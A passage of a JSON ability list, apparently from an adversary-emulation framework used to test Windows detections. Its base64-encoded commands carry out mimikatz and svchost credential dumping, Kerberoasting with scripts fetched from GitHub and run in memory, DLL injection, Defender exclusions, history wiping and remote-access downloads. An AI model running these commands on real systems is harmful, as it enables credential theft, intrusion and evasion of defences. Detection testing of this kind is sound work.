"custom_parser_vals": {}, "target": "domain.user.password"}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords", "variations": []}, {"test": "JG15cGlkID0gI3twcm9jZXNzX2lkfTsgbWF2aW5qZWN0ICRteXBpZCAvSU5KRUNUUlVOTklORyAje2RsbF9wYXlsb2FkfQ==", "ability_id": "663765da7a19c54ca9f74f15936f6a2e", "technique_name": "Process Injection: Dynamic-link Library Injection", "additional_info": {}, "privilege": "", "technique_id": "T1055.001", "platform": "windows", "name": "Process Injection via mavinject.exe", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n", "variations": []}, {"test": "JHBzID0gKEdldC1OZXRUQ1BDb25uZWN0aW9uIC1Mb2NhbFBvcnQgMzM4OSAtU3RhdGUgRXN0YWJsaXNoZWQgLUVycm9yQWN0aW9uIElnbm9yZSk7IGlmKCRwcyl7JGlkID0gJHBzWzBdLk93bmluZ1Byb2Nlc3N9IGVsc2UgeyRpZCA9IChHZXQtUHJvY2VzcyBzdmNob3N0KVswXS5JZCB9OyBDOlxXaW5kb3dzXFN5c3RlbTMyXHJ1bmRsbDMyLmV4ZSBDOlx3aW5kb3dzXFN5c3RlbTMyXGNvbXN2Y3MuZGxsLCBNaW5pRHVtcCAkaWQgJGVudjpURU1QXHN2Y2hvc3QtZXhlLmRtcCBmdWxs", "ability_id": "18f31c311ac208802e88ab8d5af8603e", "technique_name": "OS Credential Dumping", "additional_info": {}, "privilege": "", "technique_id": "T1003", "platform": "windows", "name": "Dump svchost.exe to gather RDP credentials", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXHN2Y2hvc3QtZXhlLmRtcCAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n", "variations": []}, {"test": "JGtleSA9ICdCd0lBQUFBa0FBQlNVMEV5QUFRQUFBRUFBUUJoWHR2a1NlSDg1RTMxejY0Y0FYK1gyUFdHYzZESFA5VmFvRDEzQ2xqdFlhdTlTZXNVektWTEpkSHBoWTVwcGc1Y2xISUdhTDduWmJwNnF1a0xIMGxMRXEvdlc5NzlHV3pWQWdTWmFHVkNGcHVrNnAxeTY5Y1NyM1NUbHpsakpyWTc2SklqZVM0K1JoYmRXSHA5OXk4UWh3UmxsT0MwcXUvV3haYWZmSFMydGUvUEt6SWlUdUZmY1A0NnF4UW9MUjhzM1FaaEFKQm5uOVRHSmtiaXg4TVRnRXQ3aEQxREMyaFh2N2RLYUM1MzFaV3FHWEI1NE9udXZGYkQ1UDJ0K3Z5dlp1SE5tQXkzcFgwQkRYcXdFZm9aWitoaUlrMVlVRFNOT0U3OXp3bnBWUDErQk4wUEs1UUNQQ1MrNnp1amZSbFFwSituZkhMTGljd2VKOXVUN09HM2cvUCtKcFhHTjAvK0hpdG9sdWZvN1VjamgrV3ZaQVUvL2R6ckdueTVzdFF0VG1MeGRoWmJPc05ESnBzcW56d0VVZkw1K284T2h1akJIRG0vWlEwMzYxbVZzU1ZXcm1nRFBLSEdHUngrN0ZiZGdwQkVxM20xNS80enpnMzQzVjlOQnd0MStxWlUrVFNWUFUwd1J2a1dpWlJlcmptRGRlaEpJYm9Xc3g0VjhhaVd4OEZQUG5nRW1Oejg5dEJBUTh6YklySkZmbXRZbmoxZkZta051M2xnbE9lZmNhY3lZRUhQWC90cWNCdUJJZy9jcGNESHBzLzZTR0NDY2lYM3R1Zm5FZURNQVFqbUxrdThYNHpIY2dKeDZGcFZLN3FlRXV2eVYwT0dLdk5vcjliL1dLUUhJSGprekcrejZuV0hNb01ZVjVWTVRaMGpMTTVhWlE2eXB3bUZaYU5tdEw2S0R6S3Y4TDFZTjJUa0tqWEVvV3VsWE5saUJwZWxzU0p5dUlDcGxyQ1RQR0dTeFBHaWhUM3JwWjl0YkxaVWVmckZuTE5pSGZWak5pNTNZZzQ9JzsgJENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpOyBTZXQtQ29udGVudCAkZW52OlRlbXBca2V5LnNuayAtVmFsdWUgJENvbnRlbnQgLUVuY29kaW5nIEJ5dGU7IEM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOVxjc2MuZXhlIC9yOlN5c3RlbS5FbnRlcnByaXNlU2VydmljZXMuZGxsIC9vdXQ6IiRFbnY6VEVNUFxUMTIxOC4wMDkuZGxsIiAvdGFyZ2V0OmxpYnJhcnkgL2tleWZpbGU6JGVudjpUZW1wXGtleS5zbmsgYWFhYTA4X1QxMjE4LjAwOS5jczsgQzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2NC4wLjMwMzE5XHJlZ3N2Y3MuZXhlICRFbnY6VEVNUFxUMTIxOC4wMDkuZGxs", "ability_id": "88555294019f51cae8161a45f0b79dc9", "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm", "additional_info": {}, "privilege": "", "technique_id": "T1218.009", "platform": "windows", "name": "Regsvcs Uninstall Method Call Test", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["aaaa08_T1218.009.cs"], "cleanup": ["UmVtb3ZlLUl0ZW0gJEVudjpURU1QXFQxMjE4LjAwOS5kbGwgLUVycm9yQWN0aW9uIElnbm9yZSB8IE91dC1OdWxsOyAkcGFyZW50cGF0aCA9IFNwbGl0LVBhdGggLVBhdGggIiRFbnY6VEVNUFxUMTIxOC4wMDkuZGxsIjsgUmVtb3ZlLUl0ZW0gJHBhcmVudHBhdGhca2V5LnNuayAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw7IFJlbW92ZS1JdGVtICRwYXJlbnRwYXRoXFQxMjE4LjAwOS50bGIgLUVycm9yQWN0aW9uIElnbm9yZSB8IE91dC1OdWxs", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJhYWFhMDhfVDEyMTguMDA5LmNzIg=="], "executor": "psh", "access": {}, "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n", "variations": []}, {"test": "bmV0c3RhdCAtYW5vO0dldC1OZXRUQ1BDb25uZWN0aW9u", "ability_id": "613e0ffb-e6e8-4e86-b35d-10edd232679d", "technique_name": "System Network Connections Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1049", "platform": "windows", "name": "System Network Connections Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Enumerates network connections", "variations": []}, {"test": "UmVtb3ZlLUl0ZW0gKEdldC1QU1JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGg=", "ability_id": "adce11c81bb77ae74660c6c743a0442d", "technique_name": "Indicator Removal on Host: Clear Command History", "additional_info": {}, "privilege": "", "technique_id": "T1070.003", "platform": "windows", "name": "Clear Powershell History by Deleting History File", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Clears Powershell history\n", "variations": []}, {"test": "Rk9SIC9GICJ0b2tlbnM9MioiICVhIGluICgncmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEFwcCBQYXRoc1xXaW53b3JkLmV4ZSIgL1YgUEFUSCcpIGRvIHNldCBtaWNyb3NvZnRfd29yZHBhdGg9JWIgJiYgY2FsbCAiJW1pY3Jvc29mdF93b3JkcGF0aCVccHJvdG9jb2xoYW5kbGVyLmV4ZSIgIm1zLXdvcmQ6bmZ0fHV8aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIxOC9zcmMvVDEyMThUZXN0LmRvY3gi", "ability_id": "3417ba6c9bfd2c154ce3c1a7b72a63e1", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "ProtocolHandler.exe Downloaded a Suspicious File", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n", "variations": []}, {"test": "U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0xNOlxTb2Z0d2FyZVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsIC1OYW1lIEV4ZWN1dGlvblBvbGljeSAtVmFsdWUgQnlQYXNzOyAgICAgICAgJHNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdzY3JpcHQuU2hlbGwgICAgICAgIFNldC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIHwgZWNobyAkc2hlbGwuc2VuZGtleXMoIllgcmBuIik=", "ability_id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Bypass ExecutionPolicy", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Ensure the ExecutionPolicy is turned to Bypass", "variations": []}, {"test": "U2V0LUxvY2F0aW9uIFBhdGhUb0F0b21pY3NGb2xkZXI7IC5cVDE1NzJcc3JjXFQxNTcyLWRvaC1iZWFjb24ucHMxIC1Eb2hTZXJ2ZXIgI3tkb2hfc2VydmVyfSAtRG9tYWluICN7ZG9tYWlufSAtU3ViZG9tYWluICN7c3ViZG9tYWlufSAtUXVlcnlUeXBlICN7cXVlcnlfdHlwZX0gLUMySW50ZXJ2YWwgI3tjMl9pbnRlcnZhbH0gLUMySml0dGVyICN7YzJfaml0dGVyfSAtUnVuVGltZSAje3J1bnRpbWV9", "ability_id": "40175f79973e19ca87854cbd01a71554", "technique_name": "Protocol Tunneling", "additional_info": {}, "privilege": "", "technique_id": "T1572", "platform": "windows", "name": "DNS over HTTPS Regular Beaconing", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3QgLU91dEZpbGUgQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEZXNrdG9wXEFueURlc2suZXhlIGh0dHBzOi8vZG93bmxvYWQuYW55ZGVzay5jb20vQW55RGVzay5leGU7ICRmaWxlMSA9ICJDOlxVc2Vyc1wiICsgJGVudjp1c2VybmFtZSArICJcRGVza3RvcFxBbnlEZXNrLmV4ZSI7IFN0YXJ0LVByb2Nlc3MgJGZpbGUxIC9TOw==", "ability_id": "7dabcbecab0334b115feefab1630f84a", "technique_name": "Remote Access Software", "additional_info": {}, "privilege": "", "technique_id": "T1219", "platform": "windows", "name": "AnyDesk Files Detected Test on Windows", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGZpbGUxID0gIkM6XFVzZXJzXCIgKyAkZW52OnVzZXJuYW1lICsgIlxEZXNrdG9wXEFueURlc2suZXhlLmV4ZSI7IFJlbW92ZS1JdGVtICRmaWxlMSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n", "variations": []}, {"test": "bXNodGEuZXhlICJhYm91dDo8aHRhOmFwcGxpY2F0aW9uPjxzY3JpcHQgbGFuZ3VhZ2U9IlZCU2NyaXB0Ij5DbG9zZShFeGVjdXRlKCJDcmVhdGVPYmplY3QoIiJXc2NyaXB0LlNoZWxsIiIpLlJ1biUyMCIicG93ZXJzaGVsbC5leGUlMjAtbm9wJTIwLUNvbW1hbmQlMjBXcml0ZS1Ib3N0JTIwSGVsbG8sJTIwTVNIVEEhO1N0YXJ0LVNsZWVwJTIwLVNlY29uZHMlMjA1IiIiKSk8L3NjcmlwdD4nIg==", "ability_id": "2a842a4929889b85e1a6fd2a2fd27ec7", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Mshta used to Execute PowerShell", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvZjk0YTVkMjk4YTFiNGM1ZGZiMWYzMGEyNDZkOWM3M2QxM2IyMjg4OC9SZWNvbi9Qb3dlclZpZXcucHMxJyAtVXNlQmFzaWNQYXJzaW5nKTsgR2V0LURvbWFpblVzZXIgLVByZWF1dGhOb3RSZXF1aXJlZCAtUHJvcGVydGllcyBkaXN0aW5ndWlzaGVkbmFtZSAtVmVyYm9zZQ==", "ability_id": "e0c75b4cc32124ef4c61508694fd0808", "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting", "additional_info": {}, "privilege": "", "technique_id": "T1558.004", "platform": "windows", "name": "Get-DomainUser with PowerView", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n", "variations": []}, {"test": "LiAxMjRhNzBfUFBJRC1TcG9vZi5wczE7ICRwcGlkPUdldC1Qcm9jZXNzIGV4cGxvcmVyIHwgc2VsZWN0IC1leHBhbmQgaWQ7IFBQSUQtU3Bvb2YgLXBwaWQgJHBwaWQgLXNwYXdudG8gIkM6XFByb2dyYW0gRmlsZXNcSW50ZXJuZXQgRXhwbG9yZXJcaWV4cGxvcmUuZXhlIiAtZGxscGF0aCAiOGIzOGVlX2NhbGMuZGxsIg==", "ability_id": "bd14ef2071c8a0ba613b260e88b64b02", "technique_name": "Access Token Manipulation: Parent PID Spoofing", "additional_info": {}, "privilege": "", "technique_id": "T1134.004", "platform": "windows", "name": "Parent PID Spoofing using PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["8b38ee_calc.dll", "124a70_PPID-Spoof.ps1"], "cleanup": ["U3RvcC1Qcm9jZXNzIC1OYW1lICJjYWxjdWxhdG9yIiAtRXJyb3JBY3Rpb24gSWdub3JlOyBTdG9wLVByb2Nlc3MgLU5hbWUgImlleHBsb3JlIiAtRXJyb3JBY3Rpb24gSWdub3Jl", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI4YjM4ZWVfY2FsYy5kbGwi", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICIxMjRhNzBfUFBJRC1TcG9vZi5wczEi"], "executor": "psh", "access": {}, "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n", "variations": []}, {"test": "R2V0LUFEVXNlciAtRmlsdGVyICd1c2VyYWNjb3VudGNvbnRyb2wgLWJhbmQgNDE5NDMwNCcgLVByb3BlcnRpZXMgdXNlcmFjY291bnRjb250cm9sIHwgRm9ybWF0LVRhYmxlIG5hbWU=", "ability_id": "42102f01777d40a7db982282c4c791e9", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChpd3IgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMDQuMDAyL3NyYy9JbnZva2UtTWFsRG9jLnBzMSIgLVVzZUJhc2ljUGFyc2luZyk7ICRtYWNyb2NvZGUgPSAiICAgT3BlbiBgIkM6XFVzZXJzXFB1YmxpY1xhcnQuanNlYCIgRm9yIE91dHB1dCBBcyAjMWBuICAgV3JpdGUgIzEsIGAiV1NjcmlwdC5RdWl0YCJgbiAgIENsb3NlICMxYG4gICBTaGVsbGAkIGAicGluZyA4LjguOC44YCJgbiI7IEludm9rZS1NYWxEb2MgLW1hY3JvQ29kZSAkbWFjcm9jb2RlIC1vZmZpY2VQcm9kdWN0ICJXb3JkIg==", "ability_id": "31f1b4e545d620d521b7f731699dce2c", "technique_name": "Phishing: Spearphishing Attachment", "additional_info": {}, "privilege": "", "technique_id": "T1566.001", "platform": "windows", "name": "Word spawned a command shell and used an IP address in the command line", "requirements": [], "tactic": "initial-access", "buckets": ["initial-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gQzpcVXNlcnNcUHVibGljXGFydC5qc2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.\nUpon execution, CMD will be lauchned and ping 8.8.8.8\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgaWV4KGl3ciBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRW1waXJlUHJvamVjdC9FbXBpcmUvMDhjYmQyNzRiZWY3ODI0M2Q3YThlZDY0NDNiODM2NGFjZDFmYzQ4Yi9kYXRhL21vZHVsZV9zb3VyY2UvY3JlZGVudGlhbHMvSW52b2tlLUtlcmJlcm9hc3QucHMxIC1Vc2VCYXNpY1BhcnNpbmcpOyBJbnZva2UtS2VyYmVyb2FzdCB8IGZs", "ability_id": "8b5f748da9647a4d9c5a37f20124ba9c", "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "additional_info": {}, "privilege": "", "technique_id": "T1558.003", "platform": "windows", "name": "Request for service tickets", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n", "variations": []}, {"test": "T3V0LUFUSFBvd2VyU2hlbGxDb21tYW5kTGluZVBhcmFtZXRlciAtQ29tbWFuZExpbmVTd2l0Y2hUeXBlIEh5cGhlbiAtQ29tbWFuZFBhcmFtVmFyaWF0aW9uIEMgLVVzZUVuY29kZWRBcmd1bWVudHMgLUVuY29kZWRBcmd1bWVudHNQYXJhbVZhcmlhdGlvbiBFQSAtRXhlY3V0ZSAtRXJyb3JBY3Rpb24gU3RvcA==", "ability_id": "9cbe6aa572eed558bf7825df0726c1cb", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied", "variations": []}, {"test": "IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IDsgJEV4cGVjdGVkT3V0cHV0ID0gJ0NvbnN0cnVjdG9yXyc7IDsgJFRlc3RBcmdzID0gQHs7ICAgICBPdXRwdXRBc3NlbWJseURpcmVjdG9yeSA9ICRJbnN0YWxsZXJBc3NlbWJseURpcjsgICAgIE91dHB1dEFzc2VtYmx5RmlsZU5hbWUgPSAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZTsgICAgIEludm9jYXRpb25NZXRob2QgPSAnQ2hlY2tJZkluc3RhbGxhYmxlJzsgfTsgOyAkQWN0dWFsT3V0cHV0ID0gSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseSBAVGVzdEFyZ3MgLU1pbmltdW1WaWFibGVBc3NlbWJseTsgOyBpZiAoJEFjdHVhbE91dHB1dCAtbmUgJEV4cGVjdGVkT3V0cHV0KSB7OyAgICAgdGhyb3cgQCI7IENoZWNrSWZJbnN0YWxsYWJsZSBtZXRob2QgZXhlY3V0aW9uIHRlc3QgZmFpbHVyZS4gSW5zdGFsbGVyIGFzc2VtYmx5IGV4ZWN1dGlvbiBvdXRwdXQgZGlkIG5vdCBtYXRjaCB0aGUgZXhwZWN0ZWQgb3V0cHV0LjsgRXhwZWN0ZWQ6ICRFeHBlY3RlZE91dHB1dDsgQWN0dWFsOiAkQWN0dWFsT3V0cHV0OyAiQDsgfQ==", "ability_id": "bf16e87ab3bf5ae82da06ffc1b5e4e8c", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "CheckIfInstallable method call", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["JEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IFJlbW92ZS1JdGVtIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n", "variations": []}, {"test": "TmV3LVNlcnZpY2UgLU5hbWUgIkF0b21pY1Rlc3RTZXJ2aWNlX1Bvd2VyU2hlbGwiIC1CaW5hcnlQYXRoTmFtZSAiNDExZGE1X0F0b21pY1NlcnZpY2UuZXhlIjsgU3RhcnQtU2VydmljZSAtTmFtZSAiQXRvbWljVGVzdFNlcnZpY2VfUG93ZXJTaGVsbCI=", "ability_id": "6bcf7989d751644f9c0e092fa6bf50c9", "technique_name": "Create or Modify System Process: Windows Service", "additional_info": {}, "privilege": "", "technique_id": "T1543.003", "platform": "windows", "name": "Service Installation PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["411da5_AtomicService.exe"], "cleanup": ["U3RvcC1TZXJ2aWNlIC1OYW1lICJBdG9taWNUZXN0U2VydmljZV9Qb3dlclNoZWxsIiAyPiYxIHwgT3V0LU51bGw7IHRyeSB7KEdldC1XbWlPYmplY3QgV2luMzJfU2VydmljZSAtZmlsdGVyICJuYW1lPSdBdG9taWNUZXN0U2VydmljZV9Qb3dlclNoZWxsJyIpLkRlbGV0ZSgpfTsgY2F0Y2gge30=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI0MTFkYTVfQXRvbWljU2VydmljZS5leGUi"], "executor": "psh", "access": {}, "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n", "variations": []}, {"test": "bnNsb29rdXAgI3tyZW1vdGUuaG9zdC5pcH0=", "ability_id": "fa4ed735-7006-4451-a578-b516f80e559f", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Reverse nslookup IP", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.reverse_nslookup", "relationships": [{"edge": "has_ip", "source": "remote.host.fqdn", "custom_parser_vals": {}, "target": "remote.host.ip"}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find hostname of remote IP in domain", "variations": []}, {"test": "d21pYyBwcm9jZXNzIGdldCAvZm9ybWF0Omxpc3Q=", "ability_id": "b2a1e430ca6d36eb5af2fe666e769847", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "Process Discovery - wmic process", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n", "variations": []}, {"test": "JGV4Y2x1ZGVkUHJvY2VzcyA9ICJvdXRsb29rLmV4ZSI7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJGV4Y2x1ZGVkUHJvY2Vzcw==", "ability_id": "bf221790e6405a508143578d70d6332b", "technique_name": "Impair Defenses: Disable or Modify Tools", "additional_info": {}, "privilege": "", "technique_id": "T1562.001", "platform": "windows", "name": "Tamper with Windows Defender Evade Scanning -Process", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGV4Y2x1ZGVkUHJvY2VzcyA9ICJvdXRsb29rLmV4ZSI7IFJlbW92ZS1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgICRleGNsdWRlZFByb2Nlc3M="], "executor": "psh", "access": {}, "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of 